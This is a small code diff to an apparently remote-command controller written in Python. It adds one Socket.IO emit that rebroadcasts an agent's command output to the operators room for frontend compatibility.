@@ -4161,6 +4161,8 @@ def handle_command_result(data):
     
     print(f"🔍 Controller: Broadcasting to operators room: {result_data}")
     emit('command_result', result_data, room='operators', broadcast=True)
+    # Also emit command_output for compatibility with frontend
+    emit('command_output', {'agent_id': agent_id, 'output': output}, room='operators', broadcast=True)
     print(f"🔍 Controller: Command result broadcasted successfully")
     
     # Log activity
